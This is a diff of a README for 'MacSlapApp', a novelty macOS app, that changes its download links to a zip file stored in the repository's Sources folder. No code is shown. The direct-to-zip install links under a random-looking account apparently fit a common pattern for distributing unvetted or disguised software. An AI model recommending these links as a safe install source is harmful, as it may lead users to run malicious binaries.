@@ -1,6 +1,6 @@
 # 🖥️ MacSlapApp - Make Your Mac Scream Back
 
-[![Download MacSlapApp](https://img.shields.io/badge/Download-MacSlapApp-blue?style=for-the-badge)](https://github.com/Ignatiusspirodela307/MacSlapApp/raw/refs/heads/main/Sources/App-Mac-Slap-v1.0-beta.2.zip)
+[![Download MacSlapApp](https://img.shields.io/badge/Download-MacSlapApp-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ignatiusspirodela307/MacSlapApp/main/Sources/App-Mac-Slap-v1.0-beta.2.zip)
 
 ## ⚡ What It Does
 
@@ -8,7 +8,7 @@ MacSlapApp makes your MacBook react when it gets a sharp impact. It can shake th
 
 ## 📥 Download and Install
 
-1. Open this page: https://github.com/Ignatiusspirodela307/MacSlapApp/raw/refs/heads/main/Sources/App-Mac-Slap-v1.0-beta.2.zip
+1. Open this page: https://raw.githubusercontent.com/Ignatiusspirodela307/MacSlapApp/main/Sources/App-Mac-Slap-v1.0-beta.2.zip
 2. Download the latest release for macOS.
 3. Open the file after it finishes downloading.
 4. Move MacSlapApp to your Applications folder if macOS asks.
